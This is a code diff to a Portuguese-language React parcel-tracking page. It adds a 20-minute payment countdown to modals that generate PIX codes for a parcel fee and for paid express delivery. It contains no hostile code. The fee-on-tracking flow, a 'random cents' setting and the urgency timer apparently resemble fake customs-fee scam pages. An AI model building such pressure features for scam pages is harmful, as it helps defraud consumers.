@@ -24,6 +24,7 @@ const TrackingPage: React.FC = () => {
     const [taxPixData, setTaxPixData] = useState<any>(null);
     const [taxPixPaid, setTaxPixPaid] = useState(false);
     const [copied, setCopied] = useState(false);
+    const [timeLeft, setTimeLeft] = useState<number | null>(null);
 
     // Config State
     const [useRandomCents, setUseRandomCents] = useState(true);
@@ -91,6 +92,29 @@ const TrackingPage: React.FC = () => {
             clearTimeout(timeout);
         };
     }, [trackingData]);
+
+    useEffect(() => {
+        let timer: any;
+        if (timeLeft !== null && timeLeft > 0) {
+            timer = setInterval(() => {
+                setTimeLeft(prev => (prev !== null && prev > 0) ? prev - 1 : 0);
+            }, 1000);
+        } else if (timeLeft === 0) {
+            setShowTaxModal(false);
+            setShowExpressModal(false);
+            setPixData(null);
+            setTaxPixData(null);
+            setTimeLeft(null);
+            alert('O tempo para pagamento expirou. Gere um novo código se necessário.');
+        }
+        return () => clearInterval(timer);
+    }, [timeLeft]);
+
+    const formatTime = (seconds: number) => {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+    };
 
     const fetchTrackingData = async (searchCode: string) => {
         if (!searchCode) return;
@@ -371,7 +395,7 @@ const TrackingPage: React.FC = () => {
 
             {/* Modal Taxa */}
             {showTaxModal && trackingData?.taxa_valor && (
-                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }}>
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }}>
                     <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Calculator size={40} color="#ef4444" />
@@ -400,6 +424,7 @@ const TrackingPage: React.FC = () => {
                                     const data = await res.json();
                                     if (data && data.success) {
                                         setTaxPixData(data.data);
+                                        setTimeLeft(20 * 60); // 20 minutos
                                     } else {
                                         alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                     }
@@ -429,6 +454,11 @@ const TrackingPage: React.FC = () => {
                                 <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                     {taxPixData.qr_code}
                                 </div>
+                                {timeLeft !== null && (
+                                    <div style={{ marginBottom: '16px', color: '#ef4444', fontWeight: 800, fontSize: '1rem', background: 'rgba(239,68,68,0.1)', padding: '8px', borderRadius: '10px' }}>
+                                        🕒 Expira em: {formatTime(timeLeft)}
+                                    </div>
+                                )}
                                 <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                 <button
                                     onClick={() => {
@@ -472,14 +502,14 @@ const TrackingPage: React.FC = () => {
                             </div>
                         )}
 
-                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{taxPixPaid ? 'Fechar' : 'Voltar'}</button>
+                        <button onClick={() => { setShowTaxModal(false); setTaxPixData(null); setTaxPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{taxPixPaid ? 'Fechar' : 'Voltar'}</button>
                     </div>
                 </div>
             )}
 
             {/* Modal Acelerar */}
             {showExpressModal && (
-                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }}>
+                <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(0,0,0,0.85)', backdropFilter: 'blur(12px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }} onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }}>
                     <div style={{ background: 'rgba(20, 20, 25, 0.95)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '32px', width: '100%', maxWidth: '440px', padding: '40px', boxShadow: '0 24px 80px rgba(0,0,0,0.5)', animation: 'fadeIn 0.3s ease', textAlign: 'center' }} onClick={e => e.stopPropagation()}>
                         <div style={{ width: '80px', height: '80px', background: 'rgba(99, 102, 241, 0.1)', borderRadius: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 24px' }}>
                             <Truck size={40} color="#6366f1" />
@@ -504,6 +534,7 @@ const TrackingPage: React.FC = () => {
                                     const data = await res.json();
                                     if (data && data.success) {
                                         setPixData(data.data);
+                                        setTimeLeft(20 * 60); // 20 minutos
                                     } else {
                                         alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
                                     }
@@ -532,6 +563,11 @@ const TrackingPage: React.FC = () => {
                                 <div style={{ background: 'rgba(0,0,0,0.5)', padding: '10px', borderRadius: '8px', wordBreak: 'break-all', fontSize: '12px', color: 'rgba(255,255,255,0.7)', marginBottom: '10px', userSelect: 'all' }}>
                                     {pixData.qr_code}
                                 </div>
+                                {timeLeft !== null && (
+                                    <div style={{ marginBottom: '16px', color: '#818cf8', fontWeight: 800, fontSize: '1rem', background: 'rgba(129,140,248,0.1)', padding: '8px', borderRadius: '10px' }}>
+                                        🕒 Expira em: {formatTime(timeLeft)}
+                                    </div>
+                                )}
                                 <p style={{ fontSize: '0.85rem', color: 'rgba(255,255,255,0.35)', marginBottom: '10px' }}>Escaneie o código acima ou copie a Chave Copia e Cola.</p>
                                 <button
                                     onClick={() => {
@@ -575,7 +611,7 @@ const TrackingPage: React.FC = () => {
                             </div>
                         )}
 
-                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Cancelar'}</button>
+                        <button onClick={() => { setShowExpressModal(false); setPixData(null); setPixPaid(false); setTimeLeft(null); }} style={{ background: 'none', border: 'none', color: 'rgba(255,255,255,0.3)', marginTop: '20px', cursor: 'pointer', fontWeight: 600 }}>{pixPaid ? 'Fechar' : 'Cancelar'}</button>
                     </div>
                 </div>
             )}
